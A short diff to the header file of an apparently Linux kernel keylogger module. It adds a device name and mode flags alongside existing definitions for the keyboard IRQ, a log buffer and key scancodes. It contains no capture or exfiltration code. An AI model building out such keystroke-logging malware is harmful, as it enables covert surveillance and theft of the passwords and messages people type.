@@ -3,11 +3,17 @@
 #define KEYLOG_H
 
 #define	MODULE_NAME		"keylogger"
+#define KEY_BONUS_DEVICE	"keylog_line"
 #define KEYBOARD_IRQ		1
 #define LOG_PAGE_SIZE		(PAGE_SIZE * 16)
 #define SCANCODE_ENTER		28
 #define SCANCODE_SPACE		57
 #define SCANCODE_CAPS		58
+
+#define KFLAG_NONE		0
+#define KFLAG_IRQ		(1u << 0)
+#define KFLAG_DEV		(1u << 1)
+#define KFLAG_DEVBONUS		(1u << 2)
 
 struct key_map {
 	char			ascii;
